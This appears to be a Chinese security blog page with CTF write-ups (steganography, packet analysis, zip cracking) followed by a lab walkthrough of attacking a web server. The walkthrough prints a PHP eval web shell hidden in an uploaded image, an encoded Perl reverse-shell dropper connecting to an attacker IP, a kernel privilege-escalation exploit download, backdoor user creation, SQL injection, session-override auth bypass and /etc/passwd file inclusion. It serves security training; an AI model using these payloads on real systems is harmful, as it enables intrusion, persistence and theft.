<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102327688.png" alt="image-20200625102327688"></p>
<h3 id="比签到还水"><a href="#比签到还水" class="headerlink" title="比签到还水"></a>比签到还水</h3><p>打开网址看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102424165.png" alt="image-20200625102424165"></p>
<p>需要下载一个zip压缩包，进行下载</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102439432.png" alt="image-20200625102439432"></p>
<p>下载完如果直接打开，会报错。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102824080.png" alt="image-20200625102824080"></p>
<p>这样我们使用binwalk看看有没有隐藏文件</p>
<p>可以看到有一个隐藏图片，我们进行分离出来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102857932.png" alt="image-20200625102857932"></p>
<p>使用<code>binwalk -e 文件名</code>，发现这并不是我们要的文件，这时候就想到了，可能不能使用binwalk进行分离，试试foremost</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103024275.png" alt="image-20200625103024275"></p>
<p>命令：<code>foremost 文件名 -o 自己设置文件名</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103154968.png" alt="image-20200625103154968"></p>
<p>我们设置的输出文件名是123.这时候桌面就多出了123文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103231143.png" alt="image-20200625103231143"></p>
<p>打开看看有没有我们需要的，分离出一个二维码，直接扫一下就行了，就返回flag了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103247827.png" alt="image-20200625103247827"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103352901.png" alt="image-20200625103352901"></p>
<h3 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h3><p>可以看到提示是用wireshark来分析</p>
<p>下载文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103508433.png" alt="image-20200625103508433"></p>
<p>下载完之后使用wireshark打开文件</p>
<p>随便点击一个协议，进行追踪流</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103817559.png" alt="image-20200625103817559"></p>
<p>右键，追踪流，右键什么协议就追踪什么流，</p>
<p>我们右键的是TCP所以追踪TCP流</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103927816.png" alt="image-20200625103927816"></p>
<p>发现里面有很多编码，其实都经过尝试了，都是没用的，往下划，看看有没有有用的信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104045743.png" alt="image-20200625104045743"></p>
<p>可以看到这一大串中在z1后是16进制，文件头是ZIP的，所以我们复制z1后的16进制</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104151978.png" alt="image-20200625104151978"></p>
<p>复制完之后在010Editor中粘贴</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104401280.png" alt="image-20200625104401280"></p>
<p>另存为ZIP文件，然后进行解压，成功返回了二维码，扫描一下即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104454771.png" alt="image-20200625104454771"></p>
<h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><p>下载文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191412085.png" alt="image-20200625191412085"></p>
<p>打开发现是个游戏，要坚持60s不死，就会返回flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191451270.png" alt="image-20200625191451270"></p>
<p>当我们放大这个游戏的时候，发现旁边是空白的，然后我们可以移动到空白的地方。这是树叶方块碰不到，然后等60s在出来死掉就出现flag了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191652380.png" alt="image-20200625191652380"></p>
<p>这样就出现flag了，这是一种方法。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191712691.png" alt="image-20200625191712691"></p>
<p>还有一种方法</p>
<p>使用binwalk查看隐藏内容，发现有很多</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191937299.png" alt="image-20200625191937299"></p>
<p>然后将其分离出来，我们这里使用的是foremost</p>
<p>分离出两个文件，一个是GIF里面全是图片没有什么值得关注的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192011347.png" alt="image-20200625192011347"></p>
<p>但是在zip文件中有一个压缩包，进行解压，然后进去得到三个文件夹</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192107665.png" alt="image-20200625192107665"></p>
<p>image文件夹，也是图片没有用，这样就剩下两个文件夹了，经过测试我们发现flag在cn\bjsxt\plane下的PlaneGameFrame.class里面</p>
<p>打开该文本，搜索flag，就找到了，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192359239.png" alt="image-20200625192359239"></p>
<h3 id="fuck-4"><a href="#fuck-4" class="headerlink" title="fuck_4"></a>fuck_4</h3><p>打开网页需要下载一个zip的文件，下载下来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192449724.png" alt="image-20200625192449724"></p>
<p>下载完成后打开，发现有一个flag文本，打开看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192530397.png" alt="image-20200625192530397"></p>
<p>打开后发现需要输入文件密码，我们不知道密码，然后使用ARCHPR进行爆破一下，这样成功得到密码。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192702483.png" alt="image-20200625192702483"></p>
<p>将密码输入，打开文件，这样就成功得到了密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192824329.png" alt="image-20200625192824329"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-神马培训" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/" class="article-date">
  	<time datetime="2020-07-25T01:16:56.509Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/">
        神马培训
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>找到上传点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091445851.png" alt="image-20200715091445851"></p>
<p>上传一张正常图片，可以看到图片可以上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091559881.png" alt="image-20200715091559881"></p>
<p>再次上传该图片，使用burp抓包，发送到Repeater模块，修改文件后缀，将jpg文件后缀更改为php文件后缀，然后运行，查看页面是否返回路径，返回路径说明上传成功，相反，失败。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091752731.png" alt="image-20200715091752731"></p>
<p>复制上传路径，在页面打开看看返回信息，如果能返回信息，说明正确。因为是将后缀改成了php所以页面返回乱码，而不是图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715092826103.png" alt="image-20200715092826103"></p>
<p>在图片的乱码中添加一句话木马（尽量不要添加在图片中乱码括号的内部），再次进行提交，查看页面是否返回上传路径</p>
<p>这里加入phpinfo是为了测试页面是否返回成功，如果返回成功显示phpinfo </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	eval(@_POST["pass"]);phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>复制该路径，在页面中进行访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093327206.png" alt="image-20200715093327206"></p>
<p> 页面返回了phpinfo说明上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093439811.png" alt="image-20200715093439811"></p>
<p>使用蚁剑或者菜刀进行连接，复制url，蚁剑连接密码就是一句话木马中，方括号中的内容<code>pass</code></p>
<p>这样就连接成功了，一般flag文件都在根目录下。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093629429.png" alt="image-20200715093629429"></p>
<p>选择到根目录，找一下flag文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093753781.png" alt="image-20200715093753781"></p>
<p>找到flag文件，双击打开，里面就是flag值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093824524.png" alt="image-20200715093824524"></p>
<h4 id="对靶机进行提权"><a href="#对靶机进行提权" class="headerlink" title="对靶机进行提权"></a>对靶机进行提权</h4><p>使用蚁剑的终端打开，使用<code>uname -a</code> 查看版本或者<code>cat /proc/version</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这里的Ubuntu版本时16.04。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ubuntu 16.04 版本且 unprivileged_bpf_disable 权限没有关闭的情况下就会存在 提权漏洞</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看是否存在unprivileged_bpf_disable文件，如果存在该文件，查看文件内容是否为1，若不是1，则存在漏洞</span></span><br></pre></td></tr></table></figure>

<p>查看方式：<code>cat /proc/sys/kernel/unprivileged_bpf_disable</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715100550432.png" alt="image-20200715100550432"></p>
<p><strong>下载poc文件</strong></p>
<p>下载地址：<a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/up … mp;isappinstalled=0</a></p>
<p>下载后，复制连接，使用wget进行下载 ，下载完成后并不是我们要的名字，所以将文件重命名，把 .c 后的内容删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715100841177.png" alt="image-20200715100841177"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715101014327.png" alt="image-20200715101014327"></p>
<p>编译生成可执行文件，并赋予可执行权限</p>
<p><code>gcc -o upstream upstream44.c</code>可以将upstream只写u </p>
<p><code>gcc -o u upstream44.c</code></p>
<p>在给文件一个执行的权限</p>
<p><code>chmod a+x upstream</code></p>
<p>如果是在当前执行<code>./upstream44.c</code>是失败的，虽然也是返回shell，但是还是连接当前的权限</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715101447782.png" alt="image-20200715101447782"></p>
<p>所以我们需要上传一个反弹shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function which($pr) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">path = execute(<span class="string">"which <span class="variable">$pr</span>"</span>); </span></span><br><span class="line">return ($path ? $path : $pr); </span><br><span class="line">&#125; </span><br><span class="line">function execute($cfe) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = <span class="string">''</span>; </span></span><br><span class="line">if ($cfe) &#123; </span><br><span class="line">if(function_exists('exec')) &#123; </span><br><span class="line"><span class="meta">@exec($</span><span class="bash">cfe,<span class="variable">$res</span>); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = join(<span class="string">"\n"</span>,<span class="variable">$res</span>); </span></span><br><span class="line">&#125; elseif(function_exists('shell_exec')) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = @shell_exec(<span class="variable">$cfe</span>); </span></span><br><span class="line">&#125; elseif(function_exists('system')) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line"><span class="meta">@system($</span><span class="bash">cfe); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = @ob_get_contents(); </span></span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; elseif(function_exists('passthru')) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line"><span class="meta">@passthru($</span><span class="bash">cfe); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = @ob_get_contents(); </span></span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = <span class="string">''</span>; </span></span><br><span class="line">while(!@feof($f)) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res .= @fread(<span class="variable">$f</span>,1024); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">@pclose($</span><span class="bash">f); </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">return $res; </span><br><span class="line">&#125; </span><br><span class="line">function cf($fname,$text)&#123; </span><br><span class="line"><span class="meta">if($</span><span class="bash">fp=@fopen(<span class="variable">$fname</span>,<span class="string">'w'</span>)) &#123; </span></span><br><span class="line"><span class="meta">@fputs($</span><span class="bash">fp,@base64_decode(<span class="variable">$text</span>)); </span></span><br><span class="line"><span class="meta">@fclose($</span><span class="bash">fp); </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">$</span><span class="bash">yourip = <span class="string">"Ip"</span>; </span></span><br><span class="line"><span class="meta">$</span><span class="bash">yourport = <span class="string">'Port'</span>; </span></span><br><span class="line"><span class="meta">$</span><span class="bash">usedb = array(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>. </span></span><br><span class="line">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". </span><br><span class="line">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". </span><br><span class="line">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". </span><br><span class="line">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". </span><br><span class="line">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". </span><br><span class="line">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; </span><br><span class="line">cf('/tmp/.bc',$back_connect); </span><br><span class="line"><span class="meta">$</span><span class="bash">res = execute(<span class="built_in">which</span>(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc <span class="variable">$yourip</span> <span class="variable">$yourport</span> &amp;"</span>); </span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在kali中进行端口监听</p>
<p><code>nc -lvp [Port]</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715102933268.png" alt="image-20200715102933268"></p>
<p>shell上传成功，我们就来访问一下这个shell，在查看kali，这样就可以看到已经监听到了这个shell</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103053164.png" alt="image-20200715103053164"></p>
<p>可以使用ls查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103122196.png" alt="image-20200715103122196"></p>
<p>我们先输入u，查看，在输入id 查看当前权限，输入<code>./u</code>在输入id查看当前权限</p>
<p>可以成功看到当前全县是root了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103254238.png" alt="image-20200715103254238"></p>
<p>使用passwd改一下密码，这里更改完远程连接root是不能直接登录的。</p>
<p>因为Ubuntu通常情况下会禁止直接连接root</p>
<p><code>ssh root@Ip</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103532619.png" alt="image-20200715103532619"></p>
<p>所以我们新建一个用户，然后登录这个用户。</p>
<p><code>useradd test</code> 、<code>passwd test</code> 设置密码</p>
<p>使用ssh连接test接口</p>
<p><code>ssh test@Ip</code>，这个时候就能重新连接了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103809478.png" alt="image-20200715103809478"></p>
<p>在使用su登录root，可以看到现在就变成了root权限了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103855295.png" alt="image-20200715103855295"></p>
<p>可以看到flag文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104024194.png" alt="image-20200715104024194"></p>
<p>cat 一下这个文件。查看里面的内容，里面就是flag文件 </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104143692.png" alt="image-20200715104143692"></p>
<h4 id="主机发现和端口扫描"><a href="#主机发现和端口扫描" class="headerlink" title="主机发现和端口扫描"></a>主机发现和端口扫描</h4><p>使用<code>netdiscover -r 172.24.10.0/24</code></p>
<p>就会把网址给搜索出来，这是知道ip的情况下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104616113.png" alt="image-20200715104616113"></p>
<p>如果不知道ip直接使用<code>netdisconver</code>来全部扫描，这样扫描需要等待一段时间，因为他要查找。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104805665.png" alt="image-20200715104805665"></p>
<p>扫描到之后我们可以使用Nmap查看开放了哪些服务</p>
<p><code>nmap -sv 172.24.10.142</code> </p>
<p>可以看到开放了一个80和22端口</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105023380.png" alt="image-20200715105023380"></p>
<p>使用<code>nmap -O 172.24.10.142</code>查看版本，可以看到是一个linux系统</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105146419.png" alt="image-20200715105146419"></p>
<p>我们访问22接口，以为我们不知道密码所以先取消，在页面访问80端口，返回页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105357560.png" alt="image-20200715105357560"></p>
<p>这样我们需要找一下漏洞，可以看到url返回id，可能存在sql注入，使用单引号和%df来查看是否有sql注入，经过测试发现页面都返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105442103.png" alt="image-20200715105442103"></p>
<p>看看是否有其他漏洞，在搜索框输入1，看到url中的key显示1</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105945921.png" alt="image-20200715105945921"></p>
<p>检查一下这个内容是怎么提交的</p>
<p>可以看到他是value值进行提交上去的，这个时候就会产生xss漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715110103640.png" alt="image-20200715110103640"></p>
<p>我们试试xss漏洞是否可行</p>
<p><code>&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
<p>可以看到他将我们的xss进行url编码了，所以并没有弹框，说明这里没有xss漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715110358094.png" alt="image-20200715110358094"></p>
<p>我们可以使用御剑，或者dirsearch来爆破后台、目录</p>
<p>这里使用dirsearch，先进入dirsearch的目录，使用python3运行</p>
<p>格式：<code>python3 dirsearch -u  url/* php</code></p>
<p>怎么知道它的类型是php的呢，直接在页面的url后面加入index.php页面还是返回当前页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111232072.png" alt="image-20200715111232072"></p>
<p>可以看到搜索出一个admin/login.php，我们就找到了他的后台</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111350009.png" alt="image-20200715111350009"></p>
<p>在页面中进行访问，这样就进入了他的后台，因为他的账号和密码我们是不知道的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111450894.png" alt="image-20200715111450894"></p>
<p>所以我们先使用万能密码尝试登陆</p>
<p>使用<code>admin&#39;</code>密码随便输入，页面返回操作数据库失败</p>
<p>并返回了以下重要内容，从这里就可以判断这里存在sql注入，因为他把我们admin上面带的单引号给带入了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111749443.png" alt="image-20200715111749443"></p>
<p>我们将单引号后面加上注释符，再次登录查看页面返回，可以看到页面返回输入的密码错误</p>
<p>说明他去把用户名进行查询，然后在将我们输入的密码和他的密码进行对比，然后密码不正确，所以登录不进去</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111953521.png" alt="image-20200715111953521"></p>
<p> 可以进行一个盲注</p>
<p>格式：<code>admin&#39; and sleep(5)</code>，可以看到页面进行了延迟，通过这种注入方式得到最后的后台密码admin</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715113008271.png" alt="image-20200715113008271"></p>
<p>使用admin、admin登录，这样就成功登录到后台去了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715113146868.png" alt="image-20200715113146868"></p>
<h4 id="代码审计sql注入"><a href="#代码审计sql注入" class="headerlink" title="代码审计sql注入"></a>代码审计sql注入</h4><p>进入靶场文件，进入admin，查看admin下的 内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141329679.png" alt="image-20200715141329679"></p>
<p>输入IP找到后台在页面抓一下包，提交信息，查看Networdk会发现login.php=ck.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141720932.png" alt="image-20200715141720932"></p>
<p>等会就会返回login.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141958853.png" alt="image-20200715141958853"></p>
<p>cat查看一下login.php的源码，可以看到判断登录的地方$action=ch_login</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715142136524.png" alt="image-20200715142136524"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">global # 设置了一些全局</span><br><span class="line"><span class="meta">$</span><span class="bash">submit=<span class="variable">$_</span> POST[<span class="string">'submit'</span>];就是提交按钮</span></span><br><span class="line">把user传给了 fl_value 又把 fl_value 传给了 fl_html</span><br><span class="line"><span class="meta">$</span><span class="bash">code = <span class="variable">$_POST</span>[<span class="string">'code'</span>]; <span class="comment"># post['code']等于$code</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715142406921.png" alt="image-20200715142406921"></p>
<p>查看 fl_value 是在哪个目录下，回到html目录</p>
<p>命令:<code>grep &quot;fl_value -R ./&quot;</code></p>
<p>我们要找到function函数，可以看到前面显示的路径includes/fun.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715143239730.png" alt="image-20200715143239730"></p>
<p>vim查看一下改文件</p>
<p><code>vim includes/fun,php</code>复制fl_value，打开文件后直接粘贴，会在下方显示，不能在插入模式下粘贴。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715143708652.png" alt="image-20200715143708652"></p>
<p>搜索出以下内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">funtion过来一个fl_value值，将$str传进去，进行了一个匹配，有delete和outfile，如果有替换为空</span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144147152.png" alt="image-20200715144147152"></p>
<p>在查看login.php文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以看到又调用了 cheack_login()函数 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断从哪个页面进入的</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断用户名、密码是不是为空</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断验证码正不正确</span></span><br><span class="line">然后提交给了cheack_login()函数</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144228855.png" alt="image-20200715144228855"></p>
<p>查看一下cheack_login()函数在哪个路径下</p>
<p>命令：<code>grep &quot;cheack_login&quot; -R ../</code></p>
<p>可以看到还是正在include/fun.php文件下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144644012.png" alt="image-20200715144644012"></p>
<p>复制cheack_login，打开fun.php，还是按照之前的方法进行黏贴</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144833750.png" alt="image-20200715144833750"></p>
<p>可以看到他直接吧.$user变量直接给拼接进去了，所以就会产生sql注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715145058441.png" alt="image-20200715145058441"></p>
<h4 id="代码审计越权漏洞"><a href="#代码审计越权漏洞" class="headerlink" title="代码审计越权漏洞"></a>代码审计越权漏洞</h4><p>继续审计login.php</p>
<p>判断login和admin不为空直接跳转到admin.php，这个时候就可以想到越权漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715145659286.png" alt="image-20200715145659286"></p>
<p>进行测试，访问前台，使用hackbar的Post data复制粘贴上面红线</p>
<p>_ SESSION[‘login_in’]&amp;&amp;_SESSION[‘admin’]不要$符，让login_in和admin都等于1，方括号中不要单引号.</p>
<p>还要设置一下会话时间设置 </p>
<p><code>_ SESSION[login_time]=999999999999</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=999999999999</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150514414.png" alt="image-20200715150514414"></p>
<p>再次访问后台登录页面，这个时候就不需要密码直接进入后台了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150600196.png" alt="image-20200715150600196"></p>
<h4 id="代码审计文件包含漏洞"><a href="#代码审计文件包含漏洞" class="headerlink" title="代码审计文件包含漏洞"></a>代码审计文件包含漏洞</h4><p>继续查看admin.php文件，可以看到这样一行命令</p>
<p><code>$_GET[&#39;file]等于file，include($_GET[&#39;file&#39;]也等于file</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150917265.png" alt="image-20200715150917265"></p>
<p>这样就存在文件包含漏洞，在页面url后面输入<code>?file=/etc/passwd</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715151244021.png" alt="image-20200715151244021"></p>
<p> 再查看一下php.ini看他是不是远程文件包含，使用find查看一下路径</p>
<p><code>find / -name php.ini</code>找一下php.ini的位置</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715151515218.png" alt="image-20200715151515218"></p>
<p>找到路径，使用vi打开该文件，是off，没有远程文件包含</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152156668.png" alt="image-20200715152156668"></p>
<h4 id="代码审计后台漏洞"><a href="#代码审计后台漏洞" class="headerlink" title="代码审计后台漏洞"></a>代码审计后台漏洞</h4><p>查看一下config.php文件，使用find搜索路径</p>
<p><code>find / -name config.php</code></p>
